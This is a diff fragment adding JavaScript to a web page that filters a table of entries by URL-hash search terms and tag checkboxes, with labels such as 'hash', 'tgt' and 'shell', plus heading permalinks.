+	 if (checkbox.checked == true) {
+		 document.getElementById(label).className = 'match';
+		 document.getElementById(label + "_label").innerText = label + "✓";
+		 var slash = window.location.href.lastIndexOf("/");
+		 if (window.location.href[slash+1] == "#") {
+		     window.location.href+='+' + label
+		 } else {
+		     window.location.href+='#+' + label
+		 }
+	 } else {
+		 document.getElementById(label).className = "";
+		 document.getElementById(label + "_label").innerText = label;
+		 label = label.replace(" ", "%20");
+		 var new_href = window.location.href.replace("+"+label, "");
+		 window.location.href = new_href;
+		 if (window.location.hash == "") {
+			 document.getElementById("bin-search").value = "";
+		 }
+	 }
+ }
+
+ function filter(query) {
+     var queryArray = query.toLowerCase().trim().split(/ *\+/);
+     var binPattern = queryArray[0];
+     var functionPatterns = queryArray.splice(1);
+
+     // filter rows
+     var noResults = true;
+
+     var allItems = document.getElementsByName("item_name");
+     var allFilters = document.getElementsByName("service_name");
+     var allAttacks = document.getElementsByName("attack_name");
+     var allOS = document.getElementsByName("OS_name");
+     var allItems_parsed = [];
+     var allFilters_parsed = [];
+     var allAttacks_parsed = []; 
+     var allOS_parsed = []; 
+
+     allFilters.forEach((f) => {
+	     allFilters_parsed.push(f.id.toLowerCase());
+     });
+     var filter_chosen = functionPatterns.filter(element => allFilters_parsed.includes(element));
+     allItems.forEach((i) => {
+	     allItems_parsed.push(i.id.toLowerCase());
+     });
+     var item_chosen = functionPatterns.filter(element => allItems_parsed.includes(element));
+     allAttacks.forEach((a) => {
+	     allAttacks_parsed.push(a.id.toLowerCase());
+     });
+     var attack_chosen = functionPatterns.filter(element => allAttacks_parsed.includes(element));
+     allOS.forEach((o) => {
+	     allOS_parsed.push(o.id.toLowerCase());
+     });
+     var os_chosen = functionPatterns.filter(element => allOS_parsed.includes(element));
+
+     document.querySelectorAll('#bin-table tbody tr').forEach(function (row) {
+         var show = true;
+
+         var binName = row.children[0].firstElementChild.innerText.toLowerCase();
+	     
+         var functionElems = Array.from(row.children[0].childNodes[2].children);
+	 
+         if (show) {
+             functionElems.forEach((item) => {
+                 item.className = '';
+             });
+	     functionElems.forEach((item) => {
+	         let siblings = [];
+		 if (item.parentNode) {
+		     let sibling = item.parentNode.firstChild;
+		     while (sibling) {
+		         if (sibling.nodeType == 1 && sibling !== item) {
+			     siblings.push(sibling);
+			 }
+			     sibling = sibling.nextSibling;
+		     }
+		     for (i = 0; i < siblings.length; i++ ) {
+		         var found = false;
+			 functionPatterns.forEach((pattern) => {
+			     if (!pattern) {
+			         return;
+			     }
+					 
+			     if (siblings[i].innerText.toLowerCase().startsWith(pattern.toLowerCase())) {
+			         found = true;
+			     }
+			 });
+			 if (found) {
+	                     siblings[i].className = 'match';
+			 }
+		     }
+		     functionPatterns.forEach((p) => {
+			     if (!p) {
+				     return;
+			     }
+
+			     if (item.innerText.toLowerCase().startsWith(p.toLowerCase())) {
+				     item.className = 'match';
+			     }
+		     });
+
+		 }
+	     });
+
+         }
+	 var filled = true;
+	 var found_binName = false;
+         if (binName.indexOf(binPattern) !== -1 && binPattern.length !== 0) {
+		 found_binName = true;
+	 }
+
+	 functionElems.forEach((i) => {
+	     
+	     
+	     
+	     
+		 if (i.innerText.toLowerCase() == "username" && i.className !== "match") {
+	         filled = false;
+	     }
+
+	     
+	     
+	     
+	     
+		 if (i.innerText.toLowerCase() == "password" && i.className !== "match") {
+	         filled = false;
+	     }
+
+	     
+	     
+	     
+	     
+		 if (i.innerText.toLowerCase() == "no creds" && i.className !== "match") {
+	         filled = false;
+	     }
+
+	     
+	     
+	     
+	     
+		 if (i.innerText.toLowerCase() == "hash" && i.className !== "match") {
+	         filled = false;
+	     }
+
+	     
+	     
+	     
+	     
+		 if (i.innerText.toLowerCase() == "tgs" && i.className !== "match") {
+	         filled = false;
+	     }
+
+	     
+	     
+	     
+	     
+		 if (i.innerText.toLowerCase() == "tgt" && i.className !== "match") {
+	         filled = false;
+	     }
+
+	     
+	     
+	     
+	     
+		 if (i.innerText.toLowerCase() == "pfx" && i.className !== "match") {
+	         filled = false;
+	     }
+
+	     
+	     
+	     
+	     
+		 if (i.innerText.toLowerCase() == "shell" && i.className !== "match") {
+	         filled = false;
+	     }
+
+	     
+	 });
+
+	 var found_filter = -1;
+	 if (filter_chosen.length !== 0) {
+		 found_filter = 0;
+		 filter_chosen.forEach((f) => {
+			 functionElems.forEach((i) => {
+				 if (i.innerText.toLowerCase() == f) {
+					 found_filter = found_filter + 1;
+				 }
+			 });
+		 });
+	 }
+
+	 var found_attack = -1;
+	 if (attack_chosen.length !== 0) {
+		 found_attack = 0;
+		 attack_chosen.forEach((a) => {
+			 functionElems.forEach((i) => {
+				 if (i.innerText.toLowerCase() == a) {
+					 found_attack = found_attack + 1;
+				 }
+			 });
+		 });
+	 }
+					 
+	 var found_os = -1;
+	 if (os_chosen.length !== 0) {
+		 found_os = 0;
+		 os_chosen.forEach((o) => {
+			 functionElems.forEach((i) => {
+				 if (i.innerText.toLowerCase() == o) {
+					 found_os = found_os + 1;
+				 }
+			 });
+		 });
+	 }
+
+	 if ((!filled && (found_attack < 1 && found_filter < 1 && found_os < 1 && !found_binName)) || (found_attack == 0 || found_filter == 0 || found_os == 0) || (!filled && item_chosen.length !== 0) || ((found_attack !== attack_chosen.length && found_attack !== -1) || (found_filter !== filter_chosen.length && found_filter !== -1) || (found_os !== os_chosen.length && found_os !== -1)) || (binPattern.length !== 0 && !found_binName)) {
+		row.style.display = 'none';
+	 } else {
+	    	row.style.display = '';
+	     	noResults = false;
+	 }
+
+	 if (functionPatterns.length == 0 && binPattern.length == 0) {
+	    	row.style.display = '';
+	     	noResults = false;
+	 }
+
+     });
+
+     // update the search message visibility
+     //var searchMessage = document.getElementById('search-message');
+     //searchMessage.style.display = noResults ? 'table-cell' : 'none';
+ }
+
+ function applyFilter() {
+     // filter on load according to the URL
+     var searchBox = document.getElementById('bin-search');
+     var query = decodeURIComponent(location.hash.slice(1));
+     filter(query);
+     if (query) {
+         searchBox.value = query;
+     }
+ }
+
+ function setup() {
+     var searchBox = document.getElementById('bin-search');
+
+     // ensure height during filtering
+     var binTableWrapper = document.getElementById('bin-table-wrapper');
+     binTableWrapper.style.height = binTableWrapper.clientHeight + 'px';
+
+     // handle user input
+     searchBox.addEventListener('input', function () {
+         var query = searchBox.value;
+         history.replaceState(null, null, encodeURI('#' + query));
+         applyFilter();
+     });
+
+     // handle shortcuts
+     addEventListener('keydown', function (event) {
+         // focus search box on valid keydown
+         if (event.key.toLowerCase().match(/^[+a-z]$/) &&
+             !(event.ctrlKey || event.altKey || event.metaKey)) {
+             searchBox.focus();
+             searchBox.parentElement.scrollIntoView();
+         }
+         // clear filter on escape
+         else if (event.key === 'Escape') {
+             location.hash = searchBox.value = '';
+             searchBox.focus();
+             searchBox.parentElement.scrollIntoView();
+         }
+     });
+
+     // handle URL changes
+     window.onhashchange = applyFilter;
+
+     // trigger filter on page load
+     applyFilter();
+ }
+
+ setup();
+</script>
+
+
+
+        <script>
+         // add permalink on headings
+         document.querySelectorAll('h2, h3, h4, h5, h5').forEach((heading) => {
+             const link = document.createElement('a');
+             link.className = 'permalink';
+             link.href = `#${heading.id}`;
+             heading.appendChild(link);
+         });
+        </script>
+    </body>
+</html>
